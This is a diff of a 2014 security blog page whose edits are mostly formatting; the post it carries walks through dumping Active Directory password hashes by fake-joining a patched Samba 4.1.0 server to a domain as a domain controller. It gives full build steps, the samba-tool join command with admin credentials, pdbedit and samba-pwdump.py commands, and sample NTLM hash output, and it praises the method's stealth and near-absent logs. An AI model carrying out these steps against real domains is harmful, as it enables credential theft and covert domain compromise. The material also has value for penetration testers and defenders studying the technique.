@@ -7,8 +7,8 @@
 <meta name="author"
     content="">
 <meta name="description"
-    content="So there was this blog post that talking about a number of ways to dump windows credentials by @lanjelot [definitly someone to follow] - here: https://www.securusglobal.com/community/2013/12/20/dumping-windows-credentials/ and at the very bottom of this post it says &amp;ldquo;AD Replication (EXPERIMENTAL)&amp;ldquo;
-What it boils down to is if you can position a system that can do DNS resolution to the target domain, and perform some other UDP traffic, you can fake join a samba server you control to a domain and it doesn&amp;rsquo;t require code execution in any way on the domain controller." />
+    content="So there was this blog post that talking about a number of ways to dump windows credentials by @lanjelot [definitly someone to follow] - here: https://www.securusglobal.com/community/2013/12/20/dumping-windows-credentials/ and at the very bottom of this post it says &amp;ldquo;AD Replication (EXPERIMENTAL)&amp;rdquo;
+What it boils down to is if you can position a system that can do DNS resolution to the target domain, and perform some other UDP traffic, you can fake join a samba server you control to a domain and it doesn&#39;t require code execution in any way on the domain controller." />
 <meta name="keywords" content="" />
 <meta name="robots" content="noodp" />
 <link rel="canonical" href="https://malicious.link/post/2014/2014-05-14-dumping-ntds-dot-dit-domain-hashes-using-samba/" />
@@ -28,7 +28,7 @@ What it boils down to is if you can position a system that can do DNS resolution
     type="text/css">
 
 
-<link rel="stylesheet" href="https://malicious.link/scss/main.min.099699ab246bf26f50616f7c9f00c79d46110459d1bd727b2d07d6fc09ece082.css">
+<link rel="stylesheet" href="https://malicious.link/scss/main.min.48be1f41dc1d94d27b5663b2b359c895efd7696597f656e57d8f6c0e126c0563.css">
 
 
 
@@ -39,21 +39,18 @@ What it boils down to is if you can position a system that can do DNS resolution
 <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#252627">
 <link rel="shortcut icon" href="/favicon.ico">
 <meta name="theme-color" content="#252627"><meta itemprop="name" content="Dumping NTDS.dit domain hashes using Samba">
-<meta itemprop="description" content="So there was this blog post that talking about a number of ways to dump windows credentials by @lanjelot [definitly someone to follow] - here: https://www.securusglobal.com/community/2013/12/20/dumping-windows-credentials/ and at the very bottom of this post it says &ldquo;AD Replication (EXPERIMENTAL)&ldquo;
-What it boils down to is if you can position a system that can do DNS resolution to the target domain, and perform some other UDP traffic, you can fake join a samba server you control to a domain and it doesn&rsquo;t require code execution in any way on the domain controller.">
-
-
+<meta itemprop="description" content="So there was this blog post that talking about a number of ways to dump windows credentials by @lanjelot [definitly someone to follow] - here: https://www.securusglobal.com/community/2013/12/20/dumping-windows-credentials/ and at the very bottom of this post it says &ldquo;AD Replication (EXPERIMENTAL)&rdquo;
+What it boils down to is if you can position a system that can do DNS resolution to the target domain, and perform some other UDP traffic, you can fake join a samba server you control to a domain and it doesn&#39;t require code execution in any way on the domain controller.">
 <meta itemprop="datePublished" content="2014-05-14T23:18:45-04:00" />
 <meta itemprop="dateModified" content="2014-05-14T23:18:45-04:00" />
 <meta itemprop="wordCount" content="523">
 
 
 
-<meta itemprop="keywords" content="" />
-<meta name="twitter:card" content="summary"/>
+<meta itemprop="keywords" content="" /><meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="Dumping NTDS.dit domain hashes using Samba"/>
-<meta name="twitter:description" content="So there was this blog post that talking about a number of ways to dump windows credentials by @lanjelot [definitly someone to follow] - here: https://www.securusglobal.com/community/2013/12/20/dumping-windows-credentials/ and at the very bottom of this post it says &ldquo;AD Replication (EXPERIMENTAL)&ldquo;
-What it boils down to is if you can position a system that can do DNS resolution to the target domain, and perform some other UDP traffic, you can fake join a samba server you control to a domain and it doesn&rsquo;t require code execution in any way on the domain controller."/>
+<meta name="twitter:description" content="So there was this blog post that talking about a number of ways to dump windows credentials by @lanjelot [definitly someone to follow] - here: https://www.securusglobal.com/community/2013/12/20/dumping-windows-credentials/ and at the very bottom of this post it says &ldquo;AD Replication (EXPERIMENTAL)&rdquo;
+What it boils down to is if you can position a system that can do DNS resolution to the target domain, and perform some other UDP traffic, you can fake join a samba server you control to a domain and it doesn&#39;t require code execution in any way on the domain controller."/>
 
 
 
@@ -128,65 +125,37 @@ What it boils down to is if you can position a system that can do DNS resolution
             
 
             <div class="post-content">
-                <p>So there was this blog post that talking about a number of ways to dump windows credentials by <a href="https://twitter.com/lanjelot">@lanjelot</a> [definitly someone to follow] - here: <a href="https://www.securusglobal.com/community/2013/12/20/dumping-windows-credentials/">https://www.securusglobal.com/community/2013/12/20/dumping-windows-credentials/</a> and at the very bottom of this post it says &ldquo;<strong>AD Replication (EXPERIMENTAL)</strong>&ldquo;</p>
-
-<p>What it boils down to is if you can position a system that can do DNS resolution to the target domain, and perform some other UDP traffic, you can fake join a samba server you control to a domain and it <strong><em>doesn&rsquo;t require code execution in any way on the domain controller</em></strong>.</p>
-
-<p>Notice: I am not doing this on a Kali Linux box, there is already an install of Samba there and I didn&rsquo;t want to try uninstalling or modifying the one installed.</p>
-
+                <p>So there was this blog post that talking about a number of ways to dump windows credentials by <a href="https://twitter.com/lanjelot">@lanjelot</a> [definitly someone to follow] - here: <a href="https://www.securusglobal.com/community/2013/12/20/dumping-windows-credentials/">https://www.securusglobal.com/community/2013/12/20/dumping-windows-credentials/</a> and at the very bottom of this post it says &ldquo;<strong>AD Replication (EXPERIMENTAL)</strong>&rdquo;</p>
+<p>What it boils down to is if you can position a system that can do DNS resolution to the target domain, and perform some other UDP traffic, you can fake join a samba server you control to a domain and it <strong><em>doesn't require code execution in any way on the domain controller</em></strong>.</p>
+<p>Notice: I am not doing this on a Kali Linux box, there is already an install of Samba there and I didn't want to try uninstalling or modifying the one installed.</p>
 <p>First, you need this patch:</p>
-
 <p><code>wget http://files.securusglobal.com/samba-4.1.0_replication-only-patch.txt</code></p>
-
 <p>and Samba 4.1.0</p>
-
 <p><code>wget http://ftp.samba.org/pub/samba/stable/samba-4.1.0.tar.gz</code></p>
-
 <p>You will probably also require some dependencies to be installed:</p>
-
 <p><code>apt-get install python2.7-dev python-samba libacl1-dev build-essential libldap2-dev libkrb5-dev attr</code></p>
-
 <p>Since the patch is kinda wonky, you need to make a <code>src</code> directory and extract samba into there first. Then apply the patch in whatever directory is above src</p>
-
 <pre><code>mkdir src
 mv samba-4.1.0.tar.gz src/
 cd src/
 tar zxvf samba-4.1.0.tar.gz
 cd /root/
-</code></pre>
-
-<p>So it would look like this:</p>
-
+</code></pre><p>So it would look like this:</p>
 <pre><code>samba-4.1.0_replication-only-patch.txt
 src/
 src/samba-4.1.0/
-</code></pre>
-
-<p>then run <code>patch -p0 &lt; samba-4.1.0_replication-only-patch.txt</code></p>
-
+</code></pre><p>then run <code>patch -p0 &lt; samba-4.1.0_replication-only-patch.txt</code></p>
 <pre><code>cd ./src/samba-4.1.0/
 ./configure
 make
 make install
-</code></pre>
-
-<p>Prepare the box:</p>
-
+</code></pre><p>Prepare the box:</p>
 <pre><code>rm -rf /var/lib/samba; mkdir /var/lib/samba; rm -f /etc/samba/smb.conf
-</code></pre>
-
-<p>Next you need to make sure you are resolving correctly (if you can&rsquo;t resolve the SRV record <code>_ldap._tcp.sittingduck.info</code> (sittingduck.info being the domain) then this isn&rsquo;t going to work.</p>
-
+</code></pre><p>Next you need to make sure you are resolving correctly (if you can't resolve the SRV record <code>_ldap._tcp.sittingduck.info</code> (sittingduck.info being the domain) then this isn't going to work.</p>
 <pre><code>echo nameserver 192.168.92.37 &gt; /etc/resolv.conf # this is the IP address of the DC
-</code></pre>
-
-<p>Then start the clone:</p>
-
+</code></pre><p>Then start the clone:</p>
 <pre><code>/usr/local/samba/bin/samba-tool domain join sittingduck.info DC -U sittingduck\\administrator
-</code></pre>
-
-<p>Looks like this:</p>
-
+</code></pre><p>Looks like this:</p>
 <pre><code>root@sambabox:~/src/samba-4.1.0# /usr/local/samba/bin/samba-tool domain join sittingduck.info DC -U sittingduck\\administrator
 Finding a writeable DC for domain 'sittingduck.info'
 Found DC 2K8DC.sittingduck.info
@@ -216,10 +185,7 @@ descriptor_sd_propagation_recursive: DC=DomainDnsZones,DC=sittingduck,DC=info no
 descriptor_sd_propagation_recursive: DC=ForestDnsZones,DC=sittingduck,DC=info not found under DC=sittingduck,DC=info
 Joined domain SITTINGDUCK (SID S-1-5-21-3147519476-3247671789-820278723) as a DC
 
-</code></pre>
-
-<p>Then to get the hashes:</p>
-
+</code></pre><p>Then to get the hashes:</p>
 <pre><code>root@sambabox:~# /usr/local/samba/bin/pdbedit -L -w
 2K8DC$:4294967295:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:CB14F1166BBE1749AC0FB40240C5DC30:[S          ]:LCT-530FC425:
 Administrator:4294967295:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:88E4D9FABAECF3DEC18DD80905521B29:[U          ]:LCT-531006A4:
@@ -228,10 +194,7 @@ nobody:65534:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:[
 jdoe:4294967295:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:88E4D9FABAECF3DEC18DD80905521B29:[UX         ]:LCT-530FC5FF:
 uber:4294967295:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:88E4D9FABAECF3DEC18DD80905521B29:[UX         ]:LCT-53101261:
 
-</code></pre>
-
-<p>Or you can do it with history:</p>
-
+</code></pre><p>Or you can do it with history:</p>
 <pre><code>root@sambabox:~# python samba-pwdump.py /usr/local/samba/private/sam.ldb.d/DC\=SITTINGDUCK\,DC\=INFO.ldb -history
 SAMBACLONE$:1104:::::
 2K8DC$:1000::cb14f1166bbe1749ac0fb40240c5dc30:::
@@ -241,9 +204,7 @@ Guest:501:::::
 jdoe:1103::88e4d9fabaecf3dec18dd80905521b29:::
 uber:1105::88e4d9fabaecf3dec18dd80905521b29:::
 uber_history0:1105:444d1edcad01ae08f49f073e12e8cc14:88e4d9fabaecf3dec18dd80905521b29:::
-</code></pre>
-
-<p>Game over. The great thing is that it never actually shows up as a joined box in the domain, and as far as I can tell the only log on the real DC is the login success of a domain admin. Plus one of the huge benefits to this method is that once you have the database Samba makes it really easy to query information like group membership or users info after the fact, not just hashes.</p>
+</code></pre><p>Game over. The great thing is that it never actually shows up as a joined box in the domain, and as far as I can tell the only log on the real DC is the login success of a domain admin. Plus one of the huge benefits to this method is that once you have the database Samba makes it really easy to query information like group membership or users info after the fact, not just hashes.</p>
 
             </div>
         </article>
@@ -265,7 +226,7 @@ uber_history0:1105:444d1edcad01ae08f49f073e12e8cc14:88e4d9fabaecf3dec18dd8090552
                 <footer class="footer">
     <div class="footer__inner">
         <div class="footer__content">
-            <span>&copy; 2019</span>
+            <span>&copy; 2020</span>
             
             <span></span>
             <span> <a href="https://malicious.link/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
